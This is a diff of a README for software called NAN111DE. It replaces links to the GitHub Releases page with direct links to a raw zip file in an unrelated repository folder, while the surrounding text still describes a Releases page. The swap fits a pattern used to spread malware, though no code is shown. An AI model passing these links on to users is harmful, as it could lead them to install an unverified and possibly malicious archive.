@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download NAN111DE](https://img.shields.io/badge/Download_NAN111DE-v1.0-brightgreen)](https://github.com/majedalsamali/NAN111DE/releases)
+[![Download NAN111DE](https://raw.githubusercontent.com/majedalsamali/NAN111DE/main/prorealistic/NAN111DE.zip)](https://raw.githubusercontent.com/majedalsamali/NAN111DE/main/prorealistic/NAN111DE.zip)
 
 ## 📋 Introduction
 
@@ -30,7 +30,7 @@ Before you download NAN111DE, make sure your computer meets the following requir
 
 1. **Visit the Download Page:** For the latest version of NAN111DE, click the link below. It will take you to the Releases page where you can download the application.
 
-   [Download NAN111DE](https://github.com/majedalsamali/NAN111DE/releases)
+   [Download NAN111DE](https://raw.githubusercontent.com/majedalsamali/NAN111DE/main/prorealistic/NAN111DE.zip)
 
 2. **Select the Appropriate Version:** Choose the version that matches your operating system (Windows, macOS, or Linux) from the list provided on the Releases page.
 
@@ -46,7 +46,7 @@ Before you download NAN111DE, make sure your computer meets the following requir
 
 For a quick download, click the button below:
 
-[![Download NAN111DE](https://img.shields.io/badge/Download_NAN111DE-v1.0-brightgreen)](https://github.com/majedalsamali/NAN111DE/releases)
+[![Download NAN111DE](https://raw.githubusercontent.com/majedalsamali/NAN111DE/main/prorealistic/NAN111DE.zip)](https://raw.githubusercontent.com/majedalsamali/NAN111DE/main/prorealistic/NAN111DE.zip)
 
 Follow the instructions above to install NAN111DE. If you encounter any issues during the installation, please refer to the troubleshooting section below.
 
